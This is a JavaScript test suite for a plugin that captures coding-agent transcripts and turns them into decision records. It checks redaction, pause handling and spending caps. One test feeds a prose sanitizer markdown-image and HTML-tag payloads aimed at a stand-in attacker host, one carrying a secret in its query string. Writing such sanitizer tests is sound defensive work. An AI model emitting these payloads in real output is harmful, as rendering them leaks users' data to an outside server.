'use strict';

// Reproductions of the M3 review findings. Each test failed before its fix.

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { spawnSync } = require('node:child_process');
const { buildEvent } = require('../plugin/src/core/event.js');
const { rawFilePath, readSessionMeta } = require('../plugin/src/core/store.js');
const { readLocal, storeDir } = require('../plugin/src/core/state.js');
const { readConfig, writeConfigCopy } = require('../plugin/src/core/config.js');
const { locateRepo } = require('../plugin/src/core/locate.js');
const { readGit } = require('../plugin/src/core/githead.js');
const { redactString } = require('../plugin/src/core/redact.js');
const { runTurn } = require('../plugin/src/worker/turn.js');
const { runSynthesis, pendingSessions, llmStatus } = require('../plugin/src/worker/synthesis.js');
const { sanitizeProse } = require('../plugin/src/synth/llm/prose.js');
const { adrFiles } = require('../plugin/src/synth/llm/adr.js');
const { promptHeader } = require('../plugin/src/synth/llm/prompt.js');
const { buildChunks } = require('../plugin/src/synth/llm/input.js');
const { makeRepo, git } = require('./helpers/repo.js');
const { runCli } = require('./helpers/cli-runner.js');

const common = (root) => path.join(root, '.git');
const T0 = Date.parse('2026-11-08T09:00:00Z');
const HOUR = 3600000;

function setup(t, llm = {}) {
  const { root, base, cleanup } = makeRepo();
  t.after(cleanup);
  assert.equal(runCli(['init', '--yes', '--no-push'], { cwd: root }).status, 0);
  const config = readConfig(common(root));
  writeConfigCopy(common(root), { ...config, llm: { ...config.llm, ...llm } });
  return { root, base };
}
const rawOf = (root, sessionId) => rawFilePath(common(root), 'claude-code', sessionId, readLocal(common(root)).machine);
function addEvents(root, sessionId, list, { at = null, withGit = false } = {}) {
  const file = rawOf(root, sessionId);
  fs.mkdirSync(path.dirname(file), { recursive: true });
  const git_ = withGit ? readGit(locateRepo(root), root) : null;
  const events = list.map(([eventType, payload, actorType], i) => buildEvent(
    { eventType, actorType, llmName: 'claude', agent: { name: 'main' }, payload },
    { tool: 'claude-code', sessionId, actorName: 'Test Person', git: git_, sources: [], summary: eventType, ...(at === null ? {} : { now: new Date(at + i * 1000) }) },
  ));
  fs.appendFileSync(file, events.map((e) => `${JSON.stringify(e)}\n`).join(''));
  return events;
}
function addGap(root, from, to) {
  const file = path.join(storeDir(common(root)), 'raw', 'cli', `local-${readLocal(common(root)).machine}.jsonl`);
  fs.mkdirSync(path.dirname(file), { recursive: true });
  const gap = buildEvent(
    { eventType: 'gap', actorType: 'plugin', agent: { name: 'main' }, payload: { from: new Date(from).toISOString(), to: new Date(to).toISOString() } },
    { tool: 'cli', sessionId: 'local', actorName: null, git: null, sources: [], summary: 'gap', now: new Date(to) },
  );
  fs.appendFileSync(file, `${JSON.stringify(gap)}\n`);
}
let uuid = 0;
const text = (at, body, cwd) => ({ type: 'assistant', uuid: `u-${uuid += 1}`, timestamp: new Date(at).toISOString(), cwd, message: { id: `m-${uuid}`, model: 'claude-opus-5-5', content: [{ type: 'text', text: body }] } });
function transcript(base, records) {
  const file = path.join(base, `transcript-${uuid += 1}.jsonl`);
  fs.writeFileSync(file, records.map((r) => `${JSON.stringify(r)}\n`).join(''));
  return file;
}
const job = (root, sessionId, kind = 'turn', transcriptPath = null) => ({ kind, tool: 'claude-code', sessionId, cwd: root, transcriptPath });
const run = (root, j) => runTurn(j, { commonDir: common(root) });
const talk = (root, sessionId, words, opts) => addEvents(root, sessionId, [['user_prompt', { prompt: words }, 'user'], ['agent_response', { last_assistant_message: 'Done' }, 'llm']], opts);
const citeFirstPrompt = (req) => {
  const id = /^\[([0-9A-Z]{26})\] \S+ user:/m.exec(req.prompt)[1];
  return { ok: true, output: { decisions: [{ title: `Decision ${id}`, decided_by: 'user', context: 'c', decision: 'd', alternatives: [], consequences: 'q', evidence: [id], related: [], supersedes: [] }], phase_notes: [] } };
};
function fakeEngine(answer = (req) => citeFirstPrompt(req)) {
  const calls = [];
  const engine = async (req) => {
    calls.push(req);
    return typeof answer === 'function' ? answer(req, calls.length) : answer;
  };
  engine.calls = calls;
  return engine;
}

// C1
test('C1: transcript text written while capture was paused is not recorded', async (t) => {
  const { root, base } = setup(t);
  addEvents(root, 's1', [['user_prompt', { prompt: 'hi' }, 'user']], { at: T0 });
  addGap(root, T0 + 10000, T0 + 60000);
  const file = transcript(base, [text(T0 + 30000, 'PRIVATE TEXT WRITTEN WHILE PAUSED', root), text(T0 + 90000, 'VISIBLE TEXT', root)]);
  await run(root, job(root, 's1', 'turn', file));
  const raw = fs.readFileSync(rawOf(root, 's1'), 'utf8');
  assert.ok(!raw.includes('PRIVATE TEXT WRITTEN WHILE PAUSED'));
  assert.ok(raw.includes('VISIBLE TEXT'));
});

test('C1: transcript text from before the session reached this repository, or from another folder, is not recorded', async (t) => {
  const { root, base } = setup(t);
  addEvents(root, 's1', [['user_prompt', { prompt: 'hi' }, 'user']], { at: T0 });
  const elsewhere = path.join(base, 'other-project');
  const file = transcript(base, [
    text(T0 - 60000, 'BEFORE THE REPOSITORY', root),
    text(T0 + 30000, 'ABOUT ANOTHER PROJECT', elsewhere),
    text(T0 + 40000, 'HERE IN THIS REPOSITORY', path.join(root, 'src')),
  ]);
  await run(root, job(root, 's1', 'turn', file));
  const raw = fs.readFileSync(rawOf(root, 's1'), 'utf8');
  assert.ok(!raw.includes('BEFORE THE REPOSITORY'));
  assert.ok(!raw.includes('ABOUT ANOTHER PROJECT'));
  assert.ok(raw.includes('HERE IN THIS REPOSITORY'));
});

// C2
test('C2: nested images, nested tags, reference images, setext headings, and comments are neutralised', () => {
  const cases = [
    '![![x](y)](https://evil.example/p?q=secret)',
    '<<b>img src="https://evil.example/p">',
    '![alt][r]\n\n[r]: https://evil.example/p',
    'Decision\n--------',
    'Decision\n========',
    '<!-- hidden -->',
  ];
  for (const input of cases) {
    const out = sanitizeProse(input, {});
    assert.ok(!/(^|[^\\])!\[/.test(out), `image survived: ${out}`);
    assert.ok(!/(^|[^\\])<[A-Za-z!/]/.test(out), `tag survived: ${out}`);
    assert.ok(!/^\s{0,3}\[[^\]]+\]:\s*\S/m.test(out), `reference survived: ${out}`);
    assert.ok(!/^\s{0,3}(=+|-+)\s*$/m.test(out), `setext underline survived: ${out}`);
  }
  const md = [...adrFiles({
    title: 'T', decided_by: { type: 'user', name: 'A' }, context: '![![x](y)](https://evil.example/q)', decision: 'd', alternatives: ['<<b>img src=x>'], consequences: 'q',
    evidence: ['01KAAAAAAAAAAAAAAAAAAA0001'], related: [], supersedes: [],
  }, { events: [{ event_id: '01KAAAAAAAAAAAAAAAAAAA0001', timestamp: '2026-11-05T10:00:00+01:00', actor: { type: 'user', name: 'A' }, sources: [] }], session: { id: 's', tool: 'claude-code', file: 'timeline/x.md' }, lang: 'en' }).values()][0];
  assert.ok(!/(^|[^\\])!\[/.test(md));
  assert.ok(!/(^|[^\\])<img/.test(md));
});

// I1
test('I1: a resumed session gets its second range after a real close with session_end', async (t) => {
  const { root } = setup(t);
  addEvents(root, 's1', [['user_prompt', { prompt: 'first' }, 'user'], ['agent_response', { last_assistant_message: 'ok' }, 'llm'], ['session_end', { reason: 'other' }, 'user']]);
  await run(root, job(root, 's1', 'close'));
  const engine = fakeEngine();
  await runSynthesis({ commonDir: common(root), engine });
  const resumed = addEvents(root, 's1', [['session_start', { source: 'resume' }, 'user'], ['user_prompt', { prompt: 'second' }, 'user'], ['agent_response', { last_assistant_message: 'ok' }, 'llm'], ['session_end', { reason: 'other' }, 'user']]);
  await run(root, job(root, 's1', 'close'));
  assert.equal(readSessionMeta(common(root), 'claude-code', 's1').closed_through, resumed[3].event_id);
  await runSynthesis({ commonDir: common(root), engine });
  assert.equal(engine.calls.length, 2);
  assert.ok(engine.calls[1].prompt.includes(resumed[1].event_id));
});

test('I1: a commit made while a session was closed is not linked to its resumed part', async (t) => {
  const { root } = setup(t);
  addEvents(root, 's1', [['user_prompt', { prompt: 'first' }, 'user'], ['session_end', { reason: 'other' }, 'user']], { withGit: true });
  await run(root, job(root, 's1', 'close'));
  fs.writeFileSync(path.join(root, 'between.md'), 'x\n');
  git(root, 'add', '-A');
  git(root, 'commit', '-q', '-m', 'Made between sessions');
  const between = git(root, 'rev-parse', 'HEAD');
  addEvents(root, 's1', [['session_start', { source: 'resume' }, 'user'], ['user_prompt', { prompt: 'second' }, 'user']], { withGit: true });
  fs.writeFileSync(path.join(root, 'during.md'), 'y\n');
  git(root, 'add', '-A');
  git(root, 'commit', '-q', '-m', 'Made during the resumed part');
  const during = git(root, 'rev-parse', 'HEAD');
  await new Promise((resolve) => setTimeout(resolve, 1100));
  addEvents(root, 's1', [['agent_response', { last_assistant_message: 'committed' }, 'llm']], { withGit: true });
  await run(root, job(root, 's1'));
  const linked = fs.readFileSync(rawOf(root, 's1'), 'utf8').split('\n').filter(Boolean).map((l) => JSON.parse(l)).filter((e) => e.event_type === 'commit_linked').map((e) => e.payload.sha);
  assert.ok(linked.includes(during));
  assert.ok(!linked.includes(between));
});

// I2
test('I2: a session that ended and was sealed, but lost its close mark, is still synthesized', async (t) => {
  const { root } = setup(t);
  addEvents(root, 's1', [['user_prompt', { prompt: 'first' }, 'user'], ['session_end', { reason: 'other' }, 'user']]);
  await run(root, job(root, 's1', 'close'));
  fs.rmSync(path.join(storeDir(common(root)), 'sessions'), { recursive: true, force: true });
  assert.equal(pendingSessions(common(root)).length, 1);
  assert.equal((await runSynthesis({ commonDir: common(root), engine: fakeEngine() })).runs, 1);
});

test('I2: a session idle for hours after its last sealed turn counts as closed', async (t) => {
  const { root } = setup(t);
  talk(root, 's1', 'first', { at: T0 });
  await run(root, job(root, 's1'));
  assert.equal(pendingSessions(common(root), { now: new Date(T0 + HOUR) }).length, 0);
  assert.equal(pendingSessions(common(root), { now: new Date(T0 + 7 * HOUR) }).length, 1);
  const result = await runSynthesis({ commonDir: common(root), engine: fakeEngine(), now: new Date(T0 + 7 * HOUR) });
  assert.equal(result.runs, 1);
});

// I3
test('I3: project redaction patterns apply to transcript text', async (t) => {
  const { root, base } = setup(t);
  writeConfigCopy(common(root), { ...readConfig(common(root)), redact_patterns: ['PROJECT-SECRET-[0-9]+'] });
  addEvents(root, 's1', [['user_prompt', { prompt: 'hi' }, 'user']], { at: T0 });
  await run(root, job(root, 's1', 'turn', transcript(base, [text(T0 + 5000, 'the value is PROJECT-SECRET-42', root)])));
  const raw = fs.readFileSync(rawOf(root, 's1'), 'utf8');
  assert.ok(raw.includes('the value is'));
  assert.ok(!raw.includes('PROJECT-SECRET-42'));
});

// I4
test('I4: a final response with the home folder is not added again as intermediate text', async (t) => {
  const { root, base } = setup(t);
  const home = os.homedir();
  const said = `Read ${home}/project/PRD.md`;
  addEvents(root, 's1', [['user_prompt', { prompt: 'hi' }, 'user'], ['agent_response', { last_assistant_message: redactString(said, [], home) }, 'llm']], { at: T0 });
  await run(root, job(root, 's1', 'turn', transcript(base, [text(T0 + 1500, said, root)])));
  const intermediate = fs.readFileSync(rawOf(root, 's1'), 'utf8').split('\n').filter(Boolean).map((l) => JSON.parse(l)).filter((e) => e.payload && e.payload.intermediate);
  assert.equal(intermediate.length, 0);
});

// I5
test('I5: the test guard wins over an exported PRODUCT_DECISIONS_CLAUDE_BIN', () => {
  const helper = path.join(__dirname, 'helpers', 'no-real-claude.js');
  const out = spawnSync(process.execPath, ['-e', `require(${JSON.stringify(helper)}); process.stdout.write(process.env.PRODUCT_DECISIONS_CLAUDE_BIN)`], {
    env: { ...process.env, PRODUCT_DECISIONS_CLAUDE_BIN: '/usr/local/bin/claude' }, encoding: 'utf8',
  });
  assert.match(out.stdout, /no-claude-in-tests$/);
});

// I6
test('I6: a failure that repeats by nature stops the run instead of trying every session', async (t) => {
  const { root } = setup(t);
  for (const s of ['s1', 's2', 's3']) {
    talk(root, s, `ask ${s}`);
    await run(root, job(root, s, 'close'));
  }
  const engine = fakeEngine({ ok: false, reason: 'no_output', detail: 'exit 0' });
  const result = await runSynthesis({ commonDir: common(root), engine });
  assert.equal(engine.calls.length, 1);
  assert.equal(result.status, 'stopped');
  assert.deepEqual(result.error, { reason: 'no_output' });
});

test('I6: a timeout is not retried automatically, but sync --llm retries it', async (t) => {
  const { root } = setup(t);
  talk(root, 's1', 'ask');
  await run(root, job(root, 's1', 'close'));
  const engine = fakeEngine((req, n) => (n === 1 ? { ok: false, reason: 'timeout', detail: 'after 600000 ms' } : citeFirstPrompt(req)));
  await runSynthesis({ commonDir: common(root), engine });
  await runSynthesis({ commonDir: common(root), engine });
  assert.equal(engine.calls.length, 1);
  await runSynthesis({ commonDir: common(root), engine, force: true });
  assert.equal(engine.calls.length, 2);
});

// I7
test('I7: a shared config cannot raise caps above the consented values', async (t) => {
  const { root } = setup(t, { max_runs_per_day: 50, max_budget_usd: 20, max_input_chars: 2000000 });
  talk(root, 's1', 'ask');
  await run(root, job(root, 's1', 'close'));
  const engine = fakeEngine();
  await runSynthesis({ commonDir: common(root), engine });
  assert.equal(engine.calls[0].config.llm.max_budget_usd, 1);
  assert.equal(engine.calls[0].config.llm.max_input_chars, 400000);
  const status = llmStatus(common(root));
  assert.equal(status.max_runs_per_day, 10);
  assert.equal(status.caps_raised, true);
  assert.match(runCli(['status'], { cwd: root }).stdout, /the project asks for more; capped at the consented values/);
});

test('I7: a shared config can still lower the caps', async (t) => {
  const { root } = setup(t, { max_budget_usd: 0.5 });
  talk(root, 's1', 'ask');
  await run(root, job(root, 's1', 'close'));
  const engine = fakeEngine();
  await runSynthesis({ commonDir: common(root), engine });
  assert.equal(engine.calls[0].config.llm.max_budget_usd, 0.5);
  assert.equal(llmStatus(common(root)).caps_raised, false);
});

// I8
test('I8: the ADR note says how to retire a decision, and that deleting it does not stick', () => {
  const md = [...adrFiles({
    title: 'T', decided_by: { type: 'user', name: 'A' }, context: 'c', decision: 'd', alternatives: [], consequences: 'q', evidence: ['01KAAAAAAAAAAAAAAAAAAA0001'], related: [], supersedes: [],
  }, { events: [{ event_id: '01KAAAAAAAAAAAAAAAAAAA0001', timestamp: '2026-11-05T10:00:00+01:00', actor: { type: 'user', name: 'A' }, sources: [] }], session: { id: 's', tool: 'claude-code', file: 'timeline/x.md' }, lang: 'en' }).values()][0];
  assert.match(md, /To retire it, change its status there\. Deleting it does not stick\./);
});

// Minor 1, graded Important: it spends runs for nothing.
test('M1: the decision list in the header never crowds out the events', () => {
  const decisions = Array.from({ length: 100 }, (_, i) => ({ id: `ADR-20261105-${String(i).padStart(6, '0')}`, title: 'x'.repeat(120), at: '2026-11-05T10:00:00+01:00' }));
  const header = promptHeader({ session: 's1', tool: 'claude-code', language: 'en', decisions, maxChars: 10000 });
  assert.ok(header.length <= 2500, String(header.length));
  const events = Array.from({ length: 5 }, (_, i) => ({ event_id: `01KAAAAAAAAAAAAAAAAAAA000${i}`, timestamp: 't', actor: { type: 'user', name: 'A' }, event_type: 'user_prompt', payload: { prompt: `ask ${i}` } }));
  const chunks = buildChunks(events, { maxChars: 10000, header });
  assert.equal(chunks.length, 1);
  assert.ok(chunks[0].text.includes('ask 4'));
});
